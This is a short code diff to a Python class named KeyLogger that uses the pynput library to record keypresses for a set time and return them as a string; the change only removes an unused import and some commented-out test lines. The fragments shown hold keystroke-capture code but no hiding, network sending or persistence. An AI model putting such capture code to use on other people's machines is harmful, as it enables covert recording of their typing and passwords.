@@ -1,4 +1,4 @@
-from pynput.keyboard import KeyCode, Listener, Key
+from pynput.keyboard import Listener, Key
 import time
 
 class KeyLogger:
@@ -6,7 +6,7 @@ class KeyLogger:
         self.keys = ''
         self.listener = None
         pass
-
+ 
     def on_press(self, key):
         if type(key) == Key:
             if key == Key.space:
@@ -36,6 +36,3 @@ class KeyLogger:
         time.sleep(Xtime)
         self.listener.stop()
         return self.keys
-# 
-# abc = KeyLogger()
-# print(abc.hook_in(5))
